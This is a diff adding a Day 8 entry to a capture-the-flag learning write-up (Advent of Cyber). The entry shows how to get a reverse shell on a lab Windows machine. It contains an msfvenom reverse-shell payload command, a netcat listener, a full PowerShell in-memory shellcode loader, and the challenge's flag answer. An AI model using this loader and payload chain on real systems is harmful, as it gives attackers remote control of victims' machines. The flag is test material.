@@ -213,3 +213,55 @@ Answer: THM{HiddenClue}.
 
 **Concepts:**
 - AWS (Amazon Web Services) and platforms under it such as CloudWatch & CloudTrail which uses JSON formatting, and this JSON data can be filtered with JQ.
+
+# Day 8
+
+**Challenge:**
+- Running `msfvenom -p windows/x64/shell_reverse_tcp LHOST=[ATTACKBOX_IP] LPORT=[PORT] -f powershell` on terminal gives the shell code needed for reverse shell as a hex-encoded byte array. 
+- The command `nc -nvlp [PORT]` is used to listen into the port and receive data after the shellcode is executed.
+- On replacing the `SHELLCODE` in this code with the hex from the first command, and executing them line by line on the PowerShell, the connection is made.
+```powershell
+$VrtAlloc = @" 
+using System; 
+using System.Runtime.InteropServices; 
+public class VrtAlloc{ 
+[DllImport("kernel32")] 
+public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect); 
+} 
+"@ 
+Add-Type $VrtAlloc 
+$WaitFor= @" 
+using System; 
+using System.Runtime.InteropServices; 
+public class WaitFor{ 
+[DllImport("kernel32.dll", SetLastError=true)] 
+public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
+} 
+"@ 
+Add-Type $WaitFor 
+$CrtThread= @" 
+using System; 
+using System.Runtime.InteropServices; 
+public class CrtThread{ 
+[DllImport("kernel32", CharSet=CharSet.Ansi)] 
+public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId); 
+} 
+"@
+Add-Type $CrtThread 
+[Byte[]] $buf = SHELLCODE
+[IntPtr]$addr = [VrtAlloc]::VirtualAlloc(0, $buf.Length, 0x3000, 0x40)
+[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $buf.Length) 
+$thandle = [CrtThread]::CreateThread(0, 0, $addr, 0, 0, 0) 
+[WaitFor]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")
+```
+![day8.JPG](https://github.com/teayahz/cryptonite_taskphase_tia/blob/main/AOC24/img/day8.JPG?raw=true)
+- Now the command `dir` can view the directories on the Windows system and other commands can be executed this way.
+
+**Questions:**
+1. *What is the flag value once Glitch gets reverse shell on the digital vault using port 4444? Note: The flag may take around a minute to appear in the **C:\Users\glitch\Desktop** directory. You can view the content of the flag by using the command **type C:\Users\glitch\Desktop\flag.txt**.*
+**Answer:** AOC{GOT_MY_ACCESS_B@CK007}. By executing `type C:\Users\glitch\Desktop\flag.txt` after the connection through port 4444 is made, `flag.txt` can be read.
+
+**Concepts:**
+- Generating shellcodes and reverse shell using msfvenom
+- Executing shellcode on PowerShell
+
